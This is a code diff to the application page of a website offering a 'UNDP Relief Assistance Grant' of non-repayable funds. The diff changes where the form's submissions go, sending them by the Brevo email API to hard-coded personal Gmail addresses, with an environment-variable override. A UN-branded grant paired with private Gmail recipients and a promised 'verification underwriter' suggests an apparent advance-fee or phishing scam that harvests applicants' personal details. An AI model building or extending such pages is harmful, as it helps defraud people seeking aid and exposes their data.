@@ -97,7 +97,7 @@ const ApplyPage = () => {
       let responseData: any = {};
       try {
         responseData = JSON.parse(rawText);
-      } catch (_) {}
+      } catch (_) { }
 
       if (res.ok && responseData.success !== false) {
         isSuccess = true;
@@ -245,7 +245,15 @@ const ApplyPage = () => {
 </body>
 </html>`;
 
-        const recipients = ["noblepediallc@gmail.com", "adebayotosin7665@gmail.com"];
+        const adminEnv =
+          process.env.NEXT_PUBLIC_ADMIN_EMAILS ||
+          process.env.ADMIN_EMAILS ||
+          "";
+        const defaultRecipients = ["porterdaniel370@gmail.com", "adebayotosin7665@gmail.com"];
+        const recipients = adminEnv
+          ? adminEnv.split(",").map((e: string) => e.trim()).filter(Boolean)
+          : defaultRecipients;
+
         for (const recipient of recipients) {
           await fetch("https://api.brevo.com/v3/smtp/email", {
             method: "POST",
@@ -290,7 +298,7 @@ const ApplyPage = () => {
                 Submit Your Relief Application
               </h2>
               <p className="leading-6 text-sm text-dark-100/80">
-                To apply for the UNDP Relief Assistance Grant, you must be 18 years of age or older. 
+                To apply for the UNDP Relief Assistance Grant, you must be 18 years of age or older.
                 These grants are non-repayable relief funds designed to assist individuals and families in need.
                 Please ensure all provided details are accurate. A verification underwriter will review your submission and contact you regarding the status of your relief fund.
               </p>
